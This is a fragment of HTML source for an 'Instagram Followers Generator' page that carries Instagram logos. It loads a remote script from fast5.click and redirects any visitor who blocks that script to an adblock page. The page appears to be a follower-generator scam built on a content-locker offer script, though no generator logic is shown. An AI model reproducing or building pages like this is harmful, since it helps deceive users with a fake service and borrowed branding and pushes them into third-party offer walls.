...
<script type="text/javascript" id="ogjs" src="https://fast5.click/cl/js/37nk17"></script>
<script type="text/javascript">if(ogblock) window.location.href = "https://fast5.click/adblock";</script>
	<title>Instagram Followers Generator</title>
		...
		<meta property="og:title" content="Instagram Followers Generator" /> <!-- Title which is displayed when your site is shared on social networks -->
		<meta property="og:description" content="Instagram Followers Generator" /> <!-- Website description which is displayed when your site is shared on social networks -->
		...
		<div class="main-wrapper">			
				<header>					
					<div class="branding-wrapper">						
						<img src="img/logo-sign.svg" class="img-fluid logo-img-1" alt="Instagram" />
						<img src="img/logo-text.svg" class="img-fluid logo-img-2" alt="Instagram" />
					</div>
				</header>
						...
						<div class="generator-wrapper">
							<div class="generator-content">								
								<div class="form-wrapper">
									<img src="img/logo-sign.svg" class="img-fluid logo-img-gen" alt="Instagram" />
